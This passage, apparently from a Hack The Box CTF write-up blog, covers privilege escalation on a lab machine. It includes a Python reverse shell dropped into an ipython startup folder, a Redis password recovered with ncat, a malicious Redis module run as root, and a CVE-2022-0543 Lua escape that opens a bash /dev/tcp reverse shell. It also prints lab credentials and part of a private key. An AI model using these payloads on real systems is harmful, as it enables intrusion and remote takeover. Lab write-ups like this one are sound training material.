+define('DBHOST','localhost');
+define('DBUSER','checkout');
+define('DBPWD','a54$K_M4?DdT^HUk');
+define('DBNAME','checkout');
+?&gt;
+</code></pre>
+<p>We found 2 credentials but the don&rsquo;t work as login credentials for any user nor they give us access to anything new in the MySql database.</p>
+<h3 id="processes-enumeration">Processes Enumeration</h3>
+<p>Before running an enumeration script like Linpeas I always like to run pspy64 and check if any process is being periodically run in the background by any user.</p>
+<pre><code class="language-bash">james_mason@shared:/dev/shm$ ./pspy64 
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+
+...(snip)...
+
+2022/11/14 12:51:01 CMD: UID=1001 PID=11616  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython 
+2022/11/14 12:51:01 CMD: UID=1001 PID=11615  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;&amp; /usr/local/bin/ipython 
+2022/11/14 12:51:01 CMD: UID=1001 PID=11617  | /usr/bin/python3 /usr/local/bin/ipython 
+</code></pre>
+<p>And Voila! we find out that there&rsquo;s a process being run approximately every minute that runs &ldquo;ipython&rdquo; inside the directory in which we have full access.</p>
+<h3 id="ipython-arbitrary-code-execution">Ipython Arbitrary Code Execution</h3>
+<p>After doing some Google-fu <a href="https://security.snyk.io/vuln/SNYK-PYTHON-IPYTHON-2348630">this page</a> talks about an ipython code execution vulnerability and leads to the release notes of a patch where we can find a link to a <a href="https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x">GitHub advisory</a> that details the vulnerability.</p>
+<p>If we create the nested directory /profile_default/startup inside /opt/scripts_review which is the directory in which ipython runs</p>
+<pre><code class="language-bash">mkdir -m 777 -p /opt/scripts_review/profile_default/startup
+</code></pre>
+<p>then we create a malicious python script inside.</p>
+<pre><code class="language-python">import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.10.14.34&quot;,443))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn(&quot;/bin/bash&quot;)
+</code></pre>
+<p>And setup a listener in our machine.</p>
+<pre><code class="language-bash">sudo ncat -lnvp 443
+</code></pre>
+<p>We can potentially receive a remote shell so let&rsquo;s wait and see if it works.</p>
+<p>After some time we successfully receive a remote shell!</p>
+<pre><code class="language-bash">Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.172.
+Ncat: Connection from 10.10.11.172:33558.
+dan_smith@shared:/opt/scripts_review$ 
+</code></pre>
+<h2 id="user-dan_smith">User: dan_smith</h2>
+<h3 id="ssh">SSH</h3>
+<p>User dan_smith has SSH access to the machine so let&rsquo;s check if the private key is present so that we can migrate to a more stable SSH shell.</p>
+<pre><code class="language-bash">dan_smith@shared:/opt/scripts_review$ cd   
+cd
+dan_smith@shared:~$ cat .ssh/id_rsa
+cat .ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
++/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ
+FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku
+sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl
+4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx
+
+...(SNIP)...
+</code></pre>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>While doing some basic enumeration we find out again that this user apart from being also a member of the developer group is member of a new suspicious group called sysadmin.</p>
+<pre><code class="language-bash">dan_smith@shared:~$ id
+uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
+</code></pre>
+<h3 id="sysadmin-group">Sysadmin group</h3>
+<p>Let&rsquo;s check for files that can be accessed by the sysadmin group.</p>
+<pre><code class="language-bash">dan_smith@shared:~$ find / -group sysadmin -ls 2&gt;/dev/null
+    17914   5836 -rwxr-x---   1 root     sysadmin  5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
+</code></pre>
+<p>It seems that we have permission to execute a binary called &ldquo;redis_connector_dev&rdquo;.</p>
+<pre><code class="language-bash">dan_smith@shared:~$ file /usr/local/bin/redis_connector_dev
+/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
+</code></pre>
+<p>Trying to execute the binary yields the following key information.</p>
+<pre><code class="language-bash">[+] Logging to redis instance using password...
+
+INFO command result:
+# Server
+redis_version:6.0.15
+
+...(SNIP)...
+</code></pre>
+<p>It&rsquo;s logging in to redis using a password, that sounds like it may be hardcoded inside the binary.</p>
+<h3 id="analyzing-the-binary">Analyzing the binary.</h3>
+<p>We start by transferring the binary to our machine in order to examine ir locally.</p>
+<pre><code class="language-bash">scp -i dan.key dan_smith@shared.htb:/usr/local/bin/redis_connector_dev .
+</code></pre>
+<p>If we run it locally unsurprisingly it will fail as we don&rsquo;t have an instance of redis running in our machine.</p>
+<pre><code class="language-bash">./redis_connector_dev
+[+] Logging to redis instance using password...
+
+INFO command result:
+ dial tcp 127.0.0.1:6379: connect: connection refused
+</code></pre>
+<p>Before dealing wi RE we could try to sniff the network with Wireshark or we can be more hacky and lazy and setup ncat to listen in port 6379 and see what happens.</p>
+<pre><code class="language-bash">❯ ncat -lnkvp 6379
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::6379
+Ncat: Listening on 0.0.0.0:6379
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:58116.
+*2
+$4
+auth
+$16
+F2WHqJUz2WEz=Gqq
+</code></pre>
+<p>Surprisingly it seemed to work, the string &ldquo;auth F2WHqJUz2WEz=Gqq&rdquo; seems to have the correct format of a redis authentication command.</p>
+<h3 id="redis-pwn">Redis PWN</h3>
+<p>Let&rsquo;s go back to the victim system and start enumerating it&rsquo;s redis instance.</p>
+<p>We confirm that authentication is needed and we have can enumerate the version number.</p>
+<pre><code class="language-bash">dan_smith@shared:~$ redis-cli
+127.0.0.1:6379&gt; info
+NOAUTH Authentication required.
+
+
+127.0.0.1:6379&gt; info server
+# Server
+redis_version:6.0.15
+</code></pre>
+<p>Let&rsquo;s try authenticated with the data that we previously extracted.</p>
+<pre><code class="language-bash">127.0.0.1:6379&gt; AUTH F2WHqJUz2WEz=Gqq
+OK
+127.0.0.1:6379&gt; 
+</code></pre>
+<h4 id="malicious-module-exploit">Malicious Module Exploit</h4>
+<p>We know that the authentication data that we extracted is of the redis administrator/root user based on the ownership of the redis_connector binary so we could try this <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">exploit</a> knowing that we can probably load modules into redis.</p>
+<p>After building the exploit in our machine we now have a .so file that we will attempt to load into redis.</p>
+<pre><code class="language-bash">❯ file module.so
+module.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, with debug_info, not stripped
+</code></pre>
+<p>We transfer it to the victim machine.</p>
+<pre><code class="language-bash">❯ scp -i dan.key ../exploits/RedisModules-ExecuteCommand/module.so dan_smith@shared.htb:/dev/shm/module.so
+</code></pre>
+<p>And then proceed to test if we can load the module and if we have code execution.</p>
+<pre><code class="language-bash">127.0.0.1:6379&gt; AUTH F2WHqJUz2WEz=Gqq
+OK
+127.0.0.1:6379&gt; MODULE LOAD /dev/shm/module.so
+OK
+127.0.0.1:6379&gt; MODULE LIST
+1) 1) &quot;name&quot;
+   2) &quot;system&quot;
+   3) &quot;ver&quot;
+   4) (integer) 1
+127.0.0.1:6379&gt; system.exec &quot;id&quot;
+&quot;uid=0(root) gid=0(root) groups=0(root)\n&quot;
+</code></pre>
+<p>It worked, for some reason we can&rsquo;t get a shell with this method but we can read the contents of the root.txt and get our root flag.</p>
+<pre><code class="language-bash">127.0.0.1:6379&gt; AUTH F2WHqJUz2WEz=Gqq
+OK
+127.0.0.1:6379&gt; MODULE LOAD /dev/shm/module.so
+OK
+127.0.0.1:6379&gt; system.exec &quot;cat /root/root.txt&quot;
+&quot;6993d7a0acfb8b0...&quot;
+</code></pre>
+<h2 id="optional-root-reverse-shell">Optional: Root Reverse Shell</h2>
+<h3 id="cve-2022-0543">CVE-2022-0543</h3>
+<p>After some investigation on how we could get RCE we find out that a recent CVE has been discovered that affects Debian distros running redis it&rsquo;s a LUA sandbox bypass that is detailed in this <a href="https://security.packt.com/redis-vulnerability-cve-2022-0543/">post</a>.</p>
+<p>Let&rsquo;s test if it works in the victim&rsquo;s machine by running the following commands.</p>
+<pre><code class="language-bash">127.0.0.1:6379&gt; AUTH F2WHqJUz2WEz=Gqq
+OK
+127.0.0.1:6379&gt; eval 'local os_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_os&quot;); local os = os_l(); os.execute(&quot;bash -c \'bash -i &gt;&amp; /dev/tcp/10.10.14.34/443 0&gt;&amp;1\'&quot;); return 0' 0
+</code></pre>
+<p>And now let&rsquo;s check if ncat has received the reverse shell.</p>
+<pre><code class="language-bash">sudo ncat -lnvp 443
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.172.
+Ncat: Connection from 10.10.11.172:60870.
+bash: cannot set terminal process group (1766): Inappropriate ioctl for device
+bash: no job control in this shell
+root@shared:/var/lib/redis# whoami
+whoami
+root
+</code></pre>
+<p>It worked!, using this CVE we can successfully get a reverse shell and fully PWN this machine.</p>
+<p>Lux-Sit</p>
+
+</article>
+
+
+      
+        <div class="my-4">
+    
+    <a href="https://alpharivs.github.io/tags/htb/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#HTB</a>
+    
+    <a href="https://alpharivs.github.io/tags/redis/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#redis</a>
+    
+    <a href="https://alpharivs.github.io/tags/sqli/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#SQLI</a>
+    
+    <a href="https://alpharivs.github.io/tags/ctf/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#ctf</a>
+    
+    <a href="https://alpharivs.github.io/tags/write-up/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#write-up</a>
+    
+    <a href="https://alpharivs.github.io/tags/ipython/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#ipython</a>
+    
+    <a href="https://alpharivs.github.io/tags/hacking/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#hacking</a>
+    
+</div>
+      
+
+      
+
+
+
+      
+        <div class="py-2">
+  
+    <div class="my-8 flex flex-col items-center md:flex-row">
+      <a href="https://alpharivs.github.io/authors/alpharivs/" class="md:me-4 text-primary-text h-24 w-24">
+        
+        
+          <img
+            src="https://alpharivs.github.io/images/profile.jpg"
+            class="bg-primary-bg w-full rounded-full"
+            alt="Avatar"
+          />
+        
+      </a>
+      <div class="mt-4 w-full md:mt-0 md:w-auto">
+        <a
+          href="https://alpharivs.github.io/authors/alpharivs/"
+          class="mb-2 block border-b pb-1 text-lg font-bold"
+        >
+          <h3>Alpharivs</h3>
+        </a>
+        <span class="block pb-2">Eternal Cybersecurity student with love for Malware and CTFs</span>
+        
+          
+          
+          
+          
+          <a href="mailto:caliburn@tutanota.de" class="me-2">
+            <i class="fas fa-envelope"></i>
+          </a>
+        
+          
+          
+          
+          
+          <a href="https://twitter.com/alpharivs" class="me-2">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+          
+          
+          
+          
+          <a href="https://github.com/Alpharivs" class="me-2">
+            <i class="fab fa-github"></i>
+          </a>
+        
+          
+          
+          
+          
+          <a href="https://app.hackthebox.com/users/525385" class="me-2">
+            <i class="fab fa-jedi-order"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+</div>
+
+      
+
+      
+
+      
+
+
+
+    </div>
+    
+      <div class="col-span-2">
+        
+        
+          <div
+  class="
+    bg-primary-bg
+   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
+>
+  <h3>On This Page</h3>
+</div>
+<div
+  class="sticky-toc  hidden px-6 pb-6 lg:block"
+>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#host-discovery">Host Discovery</a></li>
+        <li><a href="#port-scanning">Port Scanning</a></li>
+      </ul>
+    </li>
+    <li><a href="#website-tcp-80443">Website TCP 80,443</a>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#vulnerability-scanning">Vulnerability Scanning</a></li>
+        <li><a href="#directory-brute-forcing">Directory Brute-Forcing</a></li>
+        <li><a href="#exploring-the-website">Exploring the Website</a></li>
+        <li><a href="#checkout-subdomain">checkout Subdomain</a></li>
+      </ul>
+    </li>
+    <li><a href="#sqli-in-cookie-header">SQLI in Cookie Header</a>
+      <ul>
+        <li><a href="#test">Test</a></li>
+        <li><a href="#data-exfiltration">Data Exfiltration</a></li>
+      </ul>
+    </li>
+    <li><a href="#user-james_mason">User: james_mason</a>
+      <ul>
+        <li><a href="#enumeration-1">Enumeration</a></li>
+        <li><a href="#developer-group">Developer Group</a></li>
+        <li><a href="#processes-enumeration">Processes Enumeration</a></li>
+        <li><a href="#ipython-arbitrary-code-execution">Ipython Arbitrary Code Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#user-dan_smith">User: dan_smith</a>
+      <ul>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#enumeration-2">Enumeration</a></li>
+        <li><a href="#sysadmin-group">Sysadmin group</a></li>
+        <li><a href="#analyzing-the-binary">Analyzing the binary.</a></li>
+        <li><a href="#redis-pwn">Redis PWN</a>
+          <ul>
+            <li><a href="#malicious-module-exploit">Malicious Module Exploit</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#optional-root-reverse-shell">Optional: Root Reverse Shell</a>
+      <ul>
+        <li><a href="#cve-2022-0543">CVE-2022-0543</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div>
+<script>
+  window.addEventListener("DOMContentLoaded", () => {
+    enableStickyToc();
+  });
+</script>
+
+        
+      </div>
+    
+
+    
+    
+  </div>
+
+  
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        hljs.highlightAll();
+      });
+    </script>
+
+          </div>
+        </div>
+      
+    </main>
+    <footer class="pl-scrollbar">
+      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2022 <a href="https://twitter.com/alpharivs">Alpharivs</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div></div>
+    </footer>
+  </body>
+</html>
